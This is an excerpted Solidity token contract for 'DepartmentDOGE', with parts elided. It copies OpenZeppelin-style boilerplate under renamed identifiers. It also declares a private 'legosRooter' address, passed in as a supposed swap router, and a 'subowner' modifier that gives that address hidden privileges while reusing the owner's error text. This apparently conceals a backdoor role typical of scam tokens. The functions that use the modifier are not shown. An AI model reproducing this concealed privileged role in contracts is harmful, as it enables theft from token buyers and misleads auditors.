...
//https://t.me/DepartmentDOGE

pragma solidity 0.8.26;

interface DepartmentDOGE33 {
  /**
...
/*
 * @dev Provides information about the current execution DepartmentDOGE20Burnable, including the
 ...
 */
abstract contract DepartmentDOGE20Burnable {
...
// File: @openzeppelin/contracts/access/DepartmentDOGE20Ownable.sol
 ...
 * the owner.
 */
abstract contract DepartmentDOGE20Ownable is DepartmentDOGE20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DepartmentDOGE20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DepartmentDOGE20Ownable: new owner is the zero address");
 ...
 * `SafeDepartmentDOGE` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeDepartmentDOGE {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDepartmentDOGE: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDepartmentDOGE: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDepartmentDOGE: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDepartmentDOGE: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDepartmentDOGE: modulo by zero");
  }
...
contract DepartmentDOGEToken is DepartmentDOGE20Burnable, DepartmentDOGE33, DepartmentDOGE20Ownable {
    
    using SafeDepartmentDOGE for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "DepartmentDOGE";
        _symbol = "DepartmentDOGE";
        _decimals = 9;
    ...
    string public DepartmentDOGECtVersion = "DepartmentDOGE 0.8.26";
            function getDepartmentDOGECtVersion() public view returns (string memory) {
        return DepartmentDOGECtVersion;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {DepartmentDOGE33-totalSupply}.
    */
    ...
    /**
    * @dev See {DepartmentDOGE33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DepartmentDOGE20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DepartmentDOGE33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DepartmentDOGE33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DepartmentDOGE33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {DepartmentDOGE33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DepartmentDOGE33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DepartmentDOGE33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DepartmentDOGE33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DepartmentDOGE33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DepartmentDOGE33: transfer from the zero address");
        require(shippingto != address(0), "DepartmentDOGE33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DepartmentDOGE33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DepartmentDOGE33: approve from the zero address");
        require(transporteur != address(0), "DepartmentDOGE33: approve to the zero address");
